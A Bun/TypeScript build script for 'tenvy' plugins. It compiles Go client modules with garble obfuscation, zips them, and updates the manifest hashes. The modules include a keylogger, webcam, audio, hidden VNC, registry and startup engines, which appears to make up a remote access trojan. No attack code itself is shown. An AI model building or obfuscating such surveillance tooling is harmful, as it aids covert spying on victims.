#!/usr/bin/env bun
import { spawn } from "node:child_process";
import { createReadStream, promises as fs } from "node:fs";
import path from "node:path";
import os from "node:os";
import crypto from "node:crypto";
import { fileURLToPath } from "node:url";

interface PluginManifest {
  id: string;
  entry: string;
  package: {
    artifact?: string;
    hash?: string;
    sizeBytes?: number;
  };
  distribution?: {
    signatureHash?: string;
    [key: string]: unknown;
  };
  [key: string]: unknown;
}

interface BuildContext {
  repoRoot: string;
  manifest: PluginManifest;
  artifactsDir: string;
  goEnv: NodeJS.ProcessEnv;
}

interface BuildResult {
  artifactPath: string;
}

type PluginBuilder = (context: BuildContext) => Promise<BuildResult>;

const pluginBuilders: Record<string, PluginBuilder> = {
  "remote-desktop-engine": (context) => buildGoPlugin(context, "remote-desktop-engine"),
  "webcam-engine": (context) => buildGoPlugin(context, "webcam-engine"),
  "keylogger-engine": (context) => buildGoPlugin(context, "keylogger-engine"),
  "audio-engine": (context) => buildGoPlugin(context, "audio-engine"),
  "appvnc-engine": (context) => buildGoPlugin(context, "appvnc-engine"),
  "filemanager-engine": (context) => buildGoPlugin(context, "filemanager-engine"),
  "taskmanager-engine": (context) => buildGoPlugin(context, "taskmanager-engine"),
  "tcpconnections-engine": (context) => buildGoPlugin(context, "tcpconnections-engine"),
  "registry-engine": (context) => buildGoPlugin(context, "registry-engine"),
  "startup-engine": (context) => buildGoPlugin(context, "startup-engine"),
  "trigger-engine": (context) => buildGoPlugin(context, "trigger-engine"),
};

async function buildGoPlugin(context: BuildContext, cmdName: string): Promise<BuildResult> {
  const entrySegments = context.manifest.entry.split("/").filter(Boolean);
  if (entrySegments.length === 0) {
    throw new Error(`Manifest entry for ${context.manifest.id} is empty.`);
  }

  const stageRoot = await fs.mkdtemp(path.join(os.tmpdir(), `tenvy-plugin-stage-${context.manifest.id}-`));
  try {
    const outputPath = path.join(stageRoot, ...entrySegments);
    await fs.mkdir(path.dirname(outputPath), { recursive: true });

    const goEnv = { ...process.env, ...context.goEnv };
    const goArgs = ["build", "-trimpath", "-ldflags=-buildid=", "-o", outputPath, "."];

    const garbleAvailable = await checkGarbleAvailability();
    if (garbleAvailable) {
      console.log(`Building ${context.manifest.id} with garble obfuscation...`);
      await runCommand("garble", ["-tiny", ...goArgs], {
        cwd: path.join(context.repoRoot, "tenvy-client", "cmd", cmdName),
        env: goEnv,
      });
    } else {
      console.warn(`Garble not found for ${context.manifest.id}, building without obfuscation.`);
      await runCommand("go", goArgs, {
        cwd: path.join(context.repoRoot, "tenvy-client", "cmd", cmdName),
        env: goEnv,
      });
    }

    const fixedDate = new Date("2024-01-01T00:00:00Z");
    await fs.utimes(outputPath, fixedDate, fixedDate);
    const directorySegments = entrySegments.slice(0, -1);
    if (directorySegments.length > 0) {
      for (let i = 1; i <= directorySegments.length; i += 1) {
        const dirPath = path.join(stageRoot, ...directorySegments.slice(0, i));
        await fs.utimes(dirPath, fixedDate, fixedDate).catch(() => {});
      }
    }

    const artifactName = context.manifest.package.artifact ?? `${context.manifest.id}.zip`;
    const artifactPath = path.join(context.artifactsDir, artifactName);
    await fs.mkdir(context.artifactsDir, { recursive: true });
    await fs.rm(artifactPath, { force: true });

    const topLevel = entrySegments[0];
    const isDirectory = entrySegments.length > 1;
    const zipArgs = ["-X", "-q"];
    if (isDirectory) {
      zipArgs.push("-r");
    }
    zipArgs.push(artifactPath, topLevel);

    await runCommand("zip", zipArgs, { cwd: stageRoot });

    await fs.utimes(artifactPath, fixedDate, fixedDate);

    return { artifactPath };
  } finally {
    await fs.rm(stageRoot, { recursive: true, force: true });
  }
}

async function computeFileInfo(filePath: string): Promise<{ hash: string; size: number }> {
  const hash = crypto.createHash("sha256");
  const stream = createReadStream(filePath);
  for await (const chunk of stream) {
    hash.update(chunk);
  }

  const { size } = await fs.stat(filePath);
  return { hash: hash.digest("hex"), size };
}

function parseArgs(argv: string[]): { goos?: string; goarch?: string } {
  const result: { goos?: string; goarch?: string } = {};
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === "--goos") {
      result.goos = argv[++i];
    } else if (arg === "--goarch") {
      result.goarch = argv[++i];
    }
  }
  return result;
}

async function main(): Promise<void> {
  const args = parseArgs(process.argv.slice(2));
  const scriptDir = path.dirname(fileURLToPath(import.meta.url));
  const repoRoot = path.resolve(scriptDir, "..");
  const manifestsDir = path.join(repoRoot, "tenvy-server", "resources", "plugin-manifests");
  const artifactsDir = path.join(repoRoot, "tenvy-server", "resources", "plugin-artifacts");

  const goEnv: NodeJS.ProcessEnv = {};
  if (args.goos) goEnv.GOOS = args.goos;
  if (args.goarch) goEnv.GOARCH = args.goarch;

  const manifestFiles = (await fs.readdir(manifestsDir)).filter((file) => file.endsWith(".json"));
  for (const file of manifestFiles) {
    const manifestPath = path.join(manifestsDir, file);
    const manifest: PluginManifest = JSON.parse(await fs.readFile(manifestPath, "utf8"));

    const builder = pluginBuilders[manifest.id];
    if (!builder) {
      console.warn(`Skipping ${manifest.id}: no build recipe available.`);
      continue;
    }

    console.log(`Building plugin ${manifest.id}...`);
    const { artifactPath } = await builder({
      repoRoot,
      manifest,
      artifactsDir,
      goEnv,
    });

    const { hash, size } = await computeFileInfo(artifactPath);
    manifest.package.artifact ??= path.basename(artifactPath);
    manifest.package.hash = hash;
    manifest.package.sizeBytes = size;
    if (manifest.distribution && typeof manifest.distribution === "object" && "signatureHash" in manifest.distribution) {
      manifest.distribution.signatureHash = hash;
    }

    await fs.writeFile(manifestPath, `${JSON.stringify(manifest, null, "\t")}\n`);
    console.log(`Updated manifest ${manifest.id}: ${manifest.package.artifact} (${size} bytes)`);
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
